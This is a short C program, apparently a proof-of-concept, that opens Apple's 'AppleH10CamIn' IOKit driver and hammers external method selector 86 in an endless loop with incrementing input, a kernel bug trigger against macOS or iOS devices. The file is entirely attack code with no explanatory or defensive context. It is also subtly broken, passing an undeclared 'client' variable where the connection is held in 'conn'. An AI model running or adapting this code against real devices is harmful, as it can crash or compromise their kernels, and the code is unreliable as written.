#include <stdio.h>
#include <stdint.h>
#include <mach/mach.h>
#include <CoreFoundation/CoreFoundation.h>

typedef mach_port_t io_object_t;
typedef io_object_t io_service_t;
typedef io_object_t io_connect_t;
extern const mach_port_t kIOMasterPortDefault;

kern_return_t IOServiceOpen(io_service_t service, task_t task, uint32_t type, io_connect_t *client);
io_service_t IOServiceGetMatchingService(mach_port_t master, CFDictionaryRef matching CF_RELEASES_ARGUMENT);
CFMutableDictionaryRef IOServiceMatching(const char *name) CF_RETURNS_RETAINED;
kern_return_t IOConnectCallMethod(io_connect_t client, uint32_t selector, const uint64_t *in, uint32_t inCnt, const void *inStruct, size_t inStructCnt, uint64_t *out, uint32_t *outCnt, void *outStruct, size_t *outStructCnt);

int main(){
	io_connect_t conn = 0;
	io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("AppleH10CamIn"));
	if (!service){
		printf("Device probably doesn't have AppleH10 driver\n");
		return -1;
	}
	kern_return_t ret = IOServiceOpen(service, mach_task_self(), 0, &conn);
    if(ret){
        printf("Couldn't connect to AppleH10CamIn ret: %X\n", ret);
        return -1;
    }

    int i = 0;
    uint64_t in[3] = {0};

    while(1){
        in[0] = i;
        IOConnectCallMethod(client, 86, in, 3, 0, 0, 0, 0, 0, 0);
        i++;
    }

    return 0;
}
